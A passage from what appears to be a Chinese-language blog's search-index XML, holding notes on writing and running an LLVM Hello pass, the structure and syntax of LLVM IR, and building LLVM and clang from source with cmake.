href="#pass”入门”" class="headerlink" title="pass”入门”"></a>pass”入门”</h2><h3 id="编写-分析"><a href="#编写-分析" class="headerlink" title="编写/分析"></a>编写/分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cd ~&#x2F;llvm&#x2F;llvm-7.0.1.src&#x2F;lib&#x2F;Transforms&#x2F;Hello</span><br><span class="line">$ ls</span><br><span class="line">CMakeLists.txt  Hello.cpp  Hello.exports</span><br></pre></td></tr></table></figure><p><a href="https://llvm.org/docs/WritingAnLLVMPass.html">https://llvm.org/docs/WritingAnLLVMPass.html</a></p><p>可以参考官方教程再自己搞一个。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Hello</span> :</span> <span class="keyword">public</span> FunctionPass &#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">char</span> ID;</span><br><span class="line">  Hello() : FunctionPass(ID) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    errs() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">    errs().write_escaped(F.getName()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;; <span class="comment">// end of struct Hello</span></span><br><span class="line">&#125;  <span class="comment">// end of anonymous namespace</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> Hello::ID = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="literal">false</span> <span class="comment">/* Only looks at CFG */</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="literal">false</span> <span class="comment">/* Analysis Pass */</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> RegisterStandardPasses <span class="title">Y</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    PassManagerBuilder::EP_EarlyAsPossible,</span></span></span><br><span class="line"><span class="function"><span class="params">    [](<span class="keyword">const</span> PassManagerBuilder &amp;Builder,</span></span></span><br><span class="line"><span class="function"><span class="params">       legacy::PassManagerBase &amp;PM) &#123; PM.add(<span class="keyword">new</span> Hello()); &#125;)</span></span>;</span><br></pre></td></tr></table></figure><p>对上述代码的一些分析：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span>&#123;</span><br></pre></td></tr></table></figure><p>开始一个新的匿名命名空间。在<code>C++</code>中匿名命名空间会引入静态全局作用域，类似C语言中的<code>static</code>关键字，它使在匿名命名空间内声明的内容仅对当前文件可见。</p><p>接着，声明我们的<code>Pass</code>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Hello</span> :</span> <span class="keyword">public</span> FunctionPass &#123;</span><br></pre></td></tr></table></figure><p>声明了一个<code>Hello</code>类，它是<code>FunctionPass</code>的子类。<code>FunctionPass</code>类一次只操作一个函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> ID;</span><br><span class="line">Hello() : FunctionPass(ID) &#123;&#125;</span><br></pre></td></tr></table></figure><p>声明一个 pass 的 ID，llvm 将会使用ID来定位这些pass。避免使用复杂的C++运行机制。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">      errs() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">      errs().write_escaped(F.getName()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;; <span class="comment">// end of struct Hello</span></span><br><span class="line">&#125;  <span class="comment">// end of anonymous namespace</span></span><br></pre></td></tr></table></figure><p>定义<code>runOnFunction</code>方法，覆写从<code>FunctionPass</code>继承的虚函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> Hello::ID = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>初始化Pass ID。LLVM使用ID的地址来标识Pass，因此初始化值并不重要。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                           <span class="literal">false</span> <span class="comment">/* Only looks at CFG */</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                           <span class="literal">false</span> <span class="comment">/* Analysis Pass */</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>注册类<code>Hello</code>，第一个命令行参数<code>hello</code>，并命名为<code>Hello World Pass</code>。最后两个参数描述了它的行为：如果传递遍历CFG而不修改它，则第三个参数设置为<code>true</code>; 如果pass 是分析 pass，那么将会有第四个参数，为<code>true</code>，反之则为<code>false</code>.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> build</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure><p>在我们刚刚创建的<code>build</code>内，执行 <code>make</code>，得到一个新文件<code>LLVMHello.so</code></p><p>我们在<code>~/llvm/build/lib</code>下可以找到对应的文件。</p><h3 id="使用opt命令运行pass"><a href="#使用opt命令运行pass" class="headerlink" title="使用opt命令运行pass"></a>使用opt命令运行pass</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ clang -S -O3 -emit-llvm hello.c</span><br><span class="line">$ opt -load LLVMHello.so -hello &lt; hello.ll &gt; /dev/null</span><br><span class="line">Hello: main</span><br><span class="line">$ opt -load LLVMHello.so -hello -time-passes &lt; hello.bc &gt; /dev/null</span><br><span class="line">Hello: main</span><br><span class="line">===-------------------------------------------------------------------------===</span><br><span class="line">                      ... Pass execution timing report ...</span><br><span class="line">===-------------------------------------------------------------------------===</span><br><span class="line">  Total Execution Time: 0.0001 seconds (0.0001 wall clock)</span><br><span class="line"></span><br><span class="line">   ---User Time---   --User+System--   ---Wall Time---  --- Name ---</span><br><span class="line">   0.0001 ( 56.3%)   0.0001 ( 56.3%)   0.0001 ( 56.4%)  Bitcode Writer</span><br><span class="line">   0.0000 ( 37.0%)   0.0000 ( 37.0%)   0.0000 ( 37.8%)  Hello World Pass</span><br><span class="line">   0.0000 (  6.7%)   0.0000 (  6.7%)   0.0000 (  5.8%)  Module Verifier</span><br><span class="line">   0.0001 (100.0%)   0.0001 (100.0%)   0.0001 (100.0%)  Total</span><br><span class="line"></span><br><span class="line">===-------------------------------------------------------------------------===</span><br><span class="line">                                LLVM IR Parsing</span><br><span class="line">===-------------------------------------------------------------------------===</span><br><span class="line">  Total Execution Time: 0.0001 seconds (0.0001 wall clock)</span><br><span class="line"></span><br><span class="line">   ---User Time---   --User+System--   ---Wall Time---  --- Name ---</span><br><span class="line">   0.0001 (100.0%)   0.0001 (100.0%)   0.0001 (100.0%)  Parse IR</span><br><span class="line">   0.0001 (100.0%)   0.0001 (100.0%)   0.0001 (100.0%)  Total</span><br></pre></td></tr></table></figure><p>我们可以使用opt命令通过您的Pass来运行LLVM程序。由于您已使用<code>RegisterPass</code>注册了Pass，因此一旦加载，您就可以使用 <strong>opt</strong> 工具访问它。</p><p><code>-load</code>选项指定 Pass 作为共享对象加载，加载后<code>-hello</code>才是有效的。（这也是注册Pass的原因之一）。因为 <code>-hello</code>没有修改任何东西，所以直接查看结果即可。</p><p>也可以通过 <code>opt -load LLVMHello.so-help |grep -i hello</code>来查看其他注册字符串，当然最后也可以查看一下运行时间。</p><p>大致了解了 <code>pass</code> 的流程和编写骨架吧。</p><p>参考：</p><p><a href="https://llvm.org/docs/WritingAnLLVMPass.html">https://llvm.org/docs/WritingAnLLVMPass.html</a></p><p><a href="https://www.cnblogs.com/Five100Miles/">https://www.cnblogs.com/Five100Miles/</a></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> llvm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> llvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>llvm IR学习</title>
      <link href="posts/6f86e98f/"/>
      <url>posts/6f86e98f/</url>
      
        <content type="html"><![CDATA[<h3 id="IR结构"><a href="#IR结构" class="headerlink" title="IR结构"></a>IR结构</h3><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://i.loli.net/2020/07/12/n2eB89dIkVY4OT5.png" alt="llvm" style="zoom:50%;" /><ul><li>Module：每个<code>module</code>包含全局变量列表，函数列表，该模块所依赖的库（或其他module）列表，符号表以及有关目标特性的各种数据。</li><li>Function：编程语言中的函数，包括函数签名和若干个基本块，函数内的第一个基本块叫做入口基本块。</li><li>BasicBlock：是一组顺序执行的指令集合，只有一个入口和一个出口，控制流只能从第一个指令进入该块。非头尾指令执行时不会违背顺序跳转到其他指令上去。每个基本块最后一条指令一般是跳转指令（跳转到其它基本块上去），函数内最后一个基本块的最后条指令是函数返回指令。</li><li>Instruction：指令是LLVM IR中的最小可执行单位，每一条指令都单占一行</li></ul><h3 id="IR语法"><a href="#IR语法" class="headerlink" title="IR语法"></a><a href="https://llvm.zcopy.site/docs/langref/">IR语法</a></h3><h4 id="获取IR"><a href="#获取IR" class="headerlink" title="获取IR"></a>获取IR</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ clang -emit-llvm -c hello.c -o hello.bc    <span class="comment">#二进制码</span></span><br><span class="line">$ clang -emit-llvm –S -c hello.c -o hello.ll <span class="comment">#获取IR</span></span><br></pre></td></tr></table></figure><h4 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h4><ul><li>LLVM 汇编语言中的注解以分号 <code>;</code>开始，并持续到行末</li><li>全局标识符要以 <code>@</code> 字符开始。所有的函数名和全局变量都必须以 <code>@</code> 开始。</li><li>LLVM 中的局部标识符以百分号 (<code>%</code>) 开始。标识符典型的正则表达式是 <code>[%@][a-zA-Z$._][a-zA-Z$._0-9]*</code>。</li><li>LLVM 拥有一个强大的类型系统，LLVM 将整数类型定义为 <code>i*N*</code>，其中 <em>N</em> 是整数占用的字节数。如：i32，i64</li><li>矢量或阵列类型声明为 <code>[no. of elements X size of each element]</code>。对于字符串 “Hello World!”，可以使用类型 <code>[13 x i8]</code>，假设每个字符占用 1 个字节，再加上为 NULL 字符提供的 1 个额外字节。</li><li><code>hello-world</code> 字符串的全局字符串常量进行如下声明：<code>@hello = constant [13 x i8] c&quot;Hello World!\00&quot;</code>。使用关键字 <code>constant</code> 来声明后面紧跟类型和值的常量。</li><li>LLVM 允许声明和定义函数。以关键字 <code>define</code> 开始，后面紧跟返回类型，然后是函数名。返回 32 字节整数的 <code>main</code> 的简单定义类似于：<code>define i32 @main() &#123; ; some LLVM assembly code that returns i32 &#125;</code>。</li><li>函数声明：以 puts 函数为例，<code>declare i32 puts(i8*)</code>。该声明以关键字 <code>declare</code> 开始，后面紧跟着返回类型、函数名，以及该函数的可选参数列表。该声明必须是全局范围的。</li><li>每个函数均以返回语句结尾。有两种形式的返回语句：<code>ret &lt;type&gt; &lt;value&gt;</code> 或 <code>ret void</code>。对于简单的主例程，使用 <code>ret i32 0</code> 就足够了。</li><li>使用 <code>call &lt;function return type&gt; &lt;function name&gt; &lt;optional function arguments&gt;</code> 来调用函数。注意，每个函数参数都必须放在其类型的前面。返回一个 6 位的整数并接受一个 36 位的整数的函数测试的语法如下：<code>call i6 @test( i36 %arg1 )</code>。</li><li>如果函数入口块没有明确的标签，则会分配标签<code>％0</code>，那么该块中的第一个未命名的临时块将为<code>％1</code>，以此类推。</li></ul><h3 id="示例分析"><a href="#示例分析" class="headerlink" title="示例分析"></a>示例分析</h3><p>都写在注释里了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID &#x3D; &#39;hello.c&#39;   </span><br><span class="line">source_filename &#x3D; &quot;hello.c&quot;  ;指明源文件名</span><br><span class="line">target datalayout &#x3D; &quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;  </span><br><span class="line">;指明机器架构和数据布局</span><br><span class="line">target triple &#x3D; &quot;x86_64-pc-linux-gnu&quot;</span><br><span class="line">;定义字符串 hello world，unnamed_addr表明该地址不重要，并且可以合并两个相同的函数。</span><br><span class="line">@str &#x3D; private unnamed_addr constant [14 x i8] c&quot;Hello worl1d.\00&quot;</span><br><span class="line"></span><br><span class="line">; Function Attrs: nounwind uwtable</span><br><span class="line">;定义函数，local_unnamed_addr表明该地址在模块内是不明显的</span><br><span class="line">define i32 @main() local_unnamed_addr #0 &#123;</span><br><span class="line">;调用puts函数</span><br><span class="line">  %1 &#x3D; tail call i32 @puts(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @str, i64 0, i64 0))</span><br><span class="line">  ret i32 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: nounwind</span><br><span class="line">;函数声明</span><br><span class="line">declare i32 @puts(i8* nocapture readonly) local_unnamed_addr #1</span><br><span class="line"></span><br><span class="line">attributes #0 &#x3D; &#123; nounwind uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;&#x3D;&quot;false&quot; &quot;disable-tail-calls&quot;&#x3D;&quot;false&quot; &quot;less-precise-fpmad&quot;&#x3D;&quot;false&quot; &quot;no-frame-pointer-elim&quot;&#x3D;&quot;false&quot; &quot;no-infs-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-jump-tables&quot;&#x3D;&quot;false&quot; &quot;no-nans-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-trapping-math&quot;&#x3D;&quot;false&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;&#x3D;&quot;false&quot; &quot;use-soft-float&quot;&#x3D;&quot;false&quot; &#125;</span><br><span class="line">attributes #1 &#x3D; &#123; nounwind &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags &#x3D; !&#123;!0&#125;</span><br><span class="line">!llvm.ident &#x3D; !&#123;!1&#125;</span><br><span class="line"></span><br><span class="line">!0 &#x3D; !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!1 &#x3D; !&#123;!&quot;clang version 6.0.0-1ubuntu2 (tags&#x2F;RELEASE_600&#x2F;final)&quot;&#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.ibm.com/developerworks/cn/opensource/os-createcompilerllvm1/index.html#artrelatedtopics">getelementptr</a>：</p><p><code>getelementptr</code> 的第一个参数是全局字符串变量的指针。要单步执行全局变量的指针，则需要使用第一个索引，即 <code>i64 0</code>。因为 <code>getelementptr</code> 指令的第一个参数必须始终是 <code>pointer</code> 类型的值，所以第一个索引会单步调试该指针。0 值表示从该指针起偏移 0 元素偏移量。我的开发计算机运行的是 64 位 Linux，所以该指针是 8 字节。第二个索引 (<code>i64 0</code>) 用于选择字符串的第 0 个元素，该元素是作为 <code>puts</code> 的参数来提供的。</p><p>参考文章：</p><p><a href="https://llvm.zcopy.site/docs/langref/">https://llvm.zcopy.site/docs/langref/</a></p><p><a href="http://www.nagain.com/activity/article/7/">http://www.nagain.com/activity/article/7/</a></p><p><a href="https://www.ibm.com/developerworks/cn/opensource/os-createcompilerllvm1/index.html">https://www.ibm.com/developerworks/cn/opensource/os-createcompilerllvm1/index.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> llvm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> llvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>llvm 环境搭建示例</title>
      <link href="posts/a75e0ae9/"/>
      <url>posts/a75e0ae9/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>本机：<code>ubuntu 18.04</code></p><h3 id="直接安装"><a href="#直接安装" class="headerlink" title="直接安装"></a>直接安装</h3><h4 id="mac"><a href="#mac" class="headerlink" title="mac"></a>mac</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ brew install llvm</span><br></pre></td></tr></table></figure><p>配置环境变量：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">If you need to have llvm first in your PATH run:</span><br><span class="line">  echo &#x27;export PATH=&quot;/usr/local/opt/llvm/bin:$PATH&quot;&#x27; &gt;&gt; ~/.zshrc</span><br><span class="line"></span><br><span class="line">For compilers to find llvm you may need to set:</span><br><span class="line">  export LDFLAGS=&quot;-L/usr/local/opt/llvm/lib&quot;</span><br><span class="line">  export CPPFLAGS=&quot;-I/usr/local/opt/llvm/include&quot;</span><br></pre></td></tr></table></figure><h4 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install llvm</span><br><span class="line">$ sudo apt install clang</span><br></pre></td></tr></table></figure><h3 id="llvm和clang混合编译"><a href="#llvm和clang混合编译" class="headerlink" title="llvm和clang混合编译"></a>llvm和clang混合编译</h3><p>要求：</p><table><thead><tr><th align="center">Package</th><th align="center">Version</th><th>Notes</th></tr></thead><tbody><tr><td align="center"><a href="http://gcc.gnu.org/">GCC</a></td><td align="center">&gt;=5.1.0</td><td>C/C++ compiler1</td></tr><tr><td align="center"><a href="http://www.python.org/">python</a></td><td align="center">&gt;=2.7</td><td>Automated test suite2</td></tr><tr><td align="center"><a href="http://zlib.net/">zlib</a></td><td align="center">&gt;=1.2.3.4</td><td>Compression library3</td></tr><tr><td align="center"><a href="http://savannah.gnu.org/projects/make">GNU Make</a></td><td align="center">3.79, 3.79.1</td><td>Makefile/build processor4</td></tr><tr><td align="center"><a href="http://cmake.org/">CMake</a></td><td align="center">&gt;=3.4.3</td><td>Makefile/workspace generator</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install cmake</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/llvm/llvm-project.git</span><br><span class="line">$ <span class="built_in">cd</span> llvm-project</span><br><span class="line">$ mkdir build</span><br><span class="line">$ <span class="built_in">cd</span> build</span><br><span class="line">$ cmake -G <span class="string">&quot;Unix Makefiles&quot;</span> --enable-optimized --enable-targets=host-only -DLLVM_ENABLE_PROJECTS=clang ../llvm</span><br><span class="line">$ cmake --build .</span><br></pre></td></tr></table></figure><p><code>--enable-optimized</code>  打开优化，默认情况下是关闭的。这样会生成大量 debug 信息，需要较多的磁盘空间。</p><p><code>--enable-targets=host-only</code> 选择目标平台，默认情况下会生成所有平台的。 <code>host-only</code> 只选择本机即可。</p><blockquote><p>错误处理：</p><p>collect2: fatal error: ld terminated with signal 9 [Killed]</p><p>虚拟机内存不够，调大即可。</p><p>collect2: error: ld returned 1 exit status</p><p>个人情况是硬盘容量不足，拓展一下即可。</p></blockquote><h3 id="单独编译llvm"><a href="#单独编译llvm" class="headerlink" title="单独编译llvm"></a>单独编译llvm</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">下载环境包：https://releases.llvm.org/download.html</span><br><span class="line">$ mkdir llvm </span><br><span class="line">$ <span class="built_in">cd</span> llvm</span><br><span class="line">$ tar xf llvm-7.0.1.src.tar.xz</span><br><span class="line">$ mkdir build</span><br><span class="line">$ <span class="built_in">cd</span> build</span><br><span class="line">$ cmake -G <span class="string">&quot;Unix Makefiles&quot;</span> --enable-optimized --enable-targets=host-only  ../llvm-7.0.1.src</span><br><span class="line">$ cmake --build . <span class="comment">#编译</span></span><br></pre></td></tr></table></figure><p>第9行代码对应如下：</p><blockquote><p><code>cmake -G &lt;generator&gt; [options] ../llvm</code></p><p>Some common build system generators are:</p><ul><li><code>Ninja</code> 大多数llvm开发人员都使用Ninja。</li><li><code>Unix Makefiles</code> —用于生成与make兼容的并行makefile。</li><li><code>Visual Studio</code> —用于生成Visual Studio项目和解决方案。</li><li><code>Xcode</code>  用于生成Xcode项目</li></ul><p><a href="https://llvm.org/docs/GettingStarted.html">https://llvm.org/docs/GettingStarted.html</a></p><p>还有一些可选的 options：</p><ul><li><code>-DCMAKE_INSTALL_PREFIX=directory</code> 明确LLVM工具和库被安装的位置，默认在/usr/local下。</li><li><code>-DCMAKE_BUILD_TYPE=type</code> Debug选项，默认就是使用Debug，可以改为Release减少不必要的文件。</li><li><code>-DLLVM_ENABLE_ASSERTIONS=On</code> 编译时开启断言检查(assertion)，默认就是开启<br>  <strong>要注意整个llvm和build的绝对路径中不要出现中文，否则会出问题。</strong></li></ul></blockquote><h2 id="LLVM工具链的使用示例"><a href="#LLVM工具链的使用示例" class="headerlink" title="LLVM工具链的使用示例"></a>LLVM工具链的使用示例</h2><ol><li><p>Clang示例</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;hello world\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//$ clang hello.c -o hello</span></span><br></pre></td></tr></table></figure><p> 此时得到一个可执行的 <code>hello</code>文件。c</p></li><li><p>将<code>hello.c</code>编译为LLVM字节码文件</p><p> <code>$ clang -O3 -emit-llvm hello.c -c -o hello.bc</code></p><p>  ps：<code>-emit-llvm</code>选项可与<code>-S</code>或<code>-c</code>选项一起使用，以分别为代码发出LLVM <code>.ll</code>或<code>.bc</code>文件。</p></li><li><p>使用两种方式运行程序:</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./hello</span><br><span class="line">$ lli hello.bc <span class="comment"># show llvm JIT</span></span><br></pre></td></tr></table></figure></blockquote></li><li><p>使用<code>llvm-dis</code>命令查看LLVM的汇编代码:</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">llvm-dis &lt; hello.bc | less</span><br></pre></td></tr></table></figure></li><li><p>使用<a href="https://llvm.zcopy.site/docs/man/llc.html">llc</a>将程序编译为本地汇编代码:</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">llc hello.bc -o hello.s</span><br></pre></td></tr></table></figure></li></ol><p>命令小结：</p><ul><li><code>llvm-as</code>：把LLVM IR从文本格式汇编成二进制格式。注意：此处得到的<strong>不是</strong>目标平台的机器码。</li><li><code>llvm-dis</code>：<code>llvm-as</code>的逆过程，即反汇编。 不过这里的反汇编的对象是LLVM IR的二进制格式，而不是机器码。</li><li><code>opt</code>：优化LLVM IR。输出新的LLVM IR。</li><li><code>llc</code>：把LLVM IR编译成汇编码。需要用<code>as</code>进一步得到机器码。</li><li><code>lli</code>：解释执行LLVM IR。</li></ul><p>参考文章：</p><p><a href="https://llvm.zcopy.site/docs/start.html">https://llvm.zcopy.site/docs/start.html</a></p><p><a href="http://clang.llvm.org/get_started.html">http://clang.llvm.org/get_started.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> llvm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> llvm </tag>
            
            <tag> Build </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Makefile 学习</title>
      <link href="posts/3a49d5b4/"/>
      <url>posts/3a49d5b4/</url>
      
